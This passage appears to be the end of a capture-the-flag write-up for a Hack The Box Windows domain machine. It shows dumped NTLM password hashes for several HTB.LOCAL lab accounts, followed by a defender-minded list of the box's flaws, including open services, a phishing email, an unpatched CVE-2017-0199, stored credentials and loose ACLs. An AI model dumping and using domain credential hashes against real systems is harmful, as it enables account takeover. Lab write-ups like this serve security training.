HTB.LOCAL\SM_dccf830a58da45dbb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HTB.LOCAL\SM_ff493709e894499a8:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HTB.LOCAL\SM_139a5eb6ab994638a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HTB.LOCAL\SM_8257963a642b41bb9:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HTB.LOCAL\claire:1130:aad3b435b51404eeaad3b435b51404ee:313ddf48f4e1d1b1ba7a8b8260b4e4f0:::
HTB.LOCAL\herman:1131:aad3b435b51404eeaad3b435b51404ee:e5d408e37c05d8fe367b91cb9904baf2:::
HTB.LOCAL\brad:1132:aad3b435b51404eeaad3b435b51404ee:ce97078a88726c19629bc269b17ff892:::
HTB.LOCAL\julia:1133:aad3b435b51404eeaad3b435b51404ee:3ef54b9af74adfc1f50d915cff66bed8:::
HTB.LOCAL\ranj:1136:aad3b435b51404eeaad3b435b51404ee:2b825f2c696f7856c8bc71a2f1a7b918:::
HTB.LOCAL\brad_da:1140:aad3b435b51404eeaad3b435b51404ee:84189874b882b738dca71b469146b5ac:::
HTB.LOCAL\claire_da:1141:aad3b435b51404eeaad3b435b51404ee:4e851516d682edc742cf37a60b43ba50:::
HTB.LOCAL\mark:1602:aad3b435b51404eeaad3b435b51404ee:151e628f8eca699d542a54f70ec148b2:::
HTB.LOCAL\rosie:1605:aad3b435b51404eeaad3b435b51404ee:615c5c68f4852726fd0717cc63240e5a:::
```

## Security Flaws
One thing I like doing, is thinking about how to patch the system that I just exploited. What are some of the misconfigurations the author intentionally created?

0. Wide open ports - Services like FTP,SSH,SMB and SMTP should not be wide open, especially if **no** authentication is required (like we saw when using SMTP and FTP).
1. Lack of user awareness - The user (Nico) opened a random email from mrevil@evil.com and opened the attachment.
2. Lack of patching - The patch for CVE-2017-0199 was released in April. This box was released in June 2018, leaving almost a year where the patch was not applied.
3. Plaintext credentials(ish) - The user Nico should **not** have the credentials of **Tom** even if in encrypted form, as if Nico is compromised then so is Tom. Same goes for the Admin user with **Domain Admin** credentials stored in plaintext.
4. Sensitive files - Even though I didn't use it, the file ACLs.csv could have been exfiltrated and imported into (an older version of) Bloodhound without having to run bloodhound at all (remotely or locally)
5. ACLs - The ACLs that Tom had over Claire are likely not required, as well as the ACLs that Claire had over the BACKUP_ADMINS group.









